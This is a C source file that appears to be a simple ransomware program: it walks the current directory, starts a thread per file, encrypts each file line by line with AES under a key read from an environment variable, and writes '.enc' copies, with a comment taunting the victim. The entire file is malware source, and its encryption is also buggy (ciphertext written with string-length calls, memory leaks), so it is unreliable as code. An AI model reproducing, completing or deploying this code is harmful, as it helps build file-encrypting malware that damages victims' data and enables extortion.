#include <glib-2.0/glib.h>
#include <openssl/aes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <dirent.h>
#include <pthread.h>
#define MAX_LINE_LEN 512

int encrypt_file(char * file_path, AES_KEY key){
    if (!file_path){
        perror("File Path Is Not Correct !");
        return 1;
    }
    
    GList * linked_list = NULL;
    FILE * buffer;
    char * buffer_line;


    buffer_line = malloc(sizeof(char)*MAX_LINE_LEN);
    buffer = fopen(file_path, "r");
    if (!buffer){
        perror("Uable To Open File !");
        return 1;
    }
 
    while (fgets(buffer_line, MAX_LINE_LEN, buffer)){
        char * copied_line = strdup(buffer_line);
        linked_list = g_list_append(linked_list, copied_line);
    }
    free(buffer_line);
    fclose(buffer);

    for (GList * l = linked_list; l != NULL; l = l->next){
        char * line = strdup((char *) l->data);
        int len = strlen(line);
        int padding = AES_BLOCK_SIZE - (len % AES_BLOCK_SIZE);
        line = realloc(line, len + padding);
        memset(line + len, padding, padding);  /* Fill all padding bytes with padding length */
        int blocks = len + padding;
        for(int i = 0; i < blocks; i+=16){
            AES_encrypt(line+i, line+i, &key);
        }

        free(l->data);
        l->data = line;
    }

    const char* file_extension = ".enc";
    char* new_file_path = malloc(strlen(file_path) + strlen(file_extension) + 1);
    if (new_file_path) {
        strcpy(new_file_path, file_path);
        strcat(new_file_path, file_extension);
    }

    buffer = fopen(new_file_path, "wb");
    for(GList * l = linked_list; l != NULL; l = l->next){
        fwrite(l->data, strlen(l->data), 1, buffer);
    }
    free(new_file_path);
    fclose(buffer);

    g_list_free(linked_list);
    /*I'm a gentleman I won't delete your files, you wish I didn't*/

    return 0;
}

typedef struct {
    char *filename;
    AES_KEY key;
} thread_args_t;

void* encrypt_file_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    encrypt_file(args->filename, args->key);
    free(args->filename);
    free(args);
    return NULL;
}


int main() {
    char *key = getenv("BYTE_BANE_KEY");
    if (!key) {
        perror("Environment variable BYTE_BANE_KEY not set");
        return 1;
    }

    AES_KEY aes_key;
    if (AES_set_encrypt_key((unsigned char *)key, 128, &aes_key) != 0) {
        perror("Unable to set encryption key");
        return 1;
    }

    DIR *current_dir;
    struct dirent *dir;

    GArray *threads = g_array_new(FALSE, FALSE, sizeof(pthread_t));

    current_dir = opendir(".");
    if (current_dir) {
        while ((dir = readdir(current_dir)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 ||
                strcmp(dir->d_name, "..") == 0 ||
                strcmp(dir->d_name, "main") == 0) {
                continue;
            }

            thread_args_t *args = malloc(sizeof(thread_args_t));
            if (!args) {
                perror("Unable to allocate memory for thread arguments");
                closedir(current_dir);
                g_array_free(threads, TRUE);
                return 1;
            }

            args->filename = strdup(dir->d_name);
            if (!args->filename) {
                perror("Unable to duplicate filename");
                free(args);
                closedir(current_dir);
                g_array_free(threads, TRUE);
                return 1;
            }

            args->key = aes_key;

            pthread_t thread;
            if (pthread_create(&thread, NULL, encrypt_file_thread, args) != 0) {
                perror("Unable to create thread");
                free(args->filename);
                free(args);
                closedir(current_dir);
                g_array_free(threads, TRUE);
                return 1;
            }
            g_array_append_val(threads, thread);
        }
        closedir(current_dir);
    }

    for (guint i = 0; i < threads->len; i++) {
        pthread_t thread = g_array_index(threads, pthread_t, i);
        if (pthread_join(thread, NULL) != 0) {
            perror("Unable to join thread");
            g_array_free(threads, TRUE);
            return 1;
        }
    }

    g_array_free(threads, TRUE);
    return 0;
}
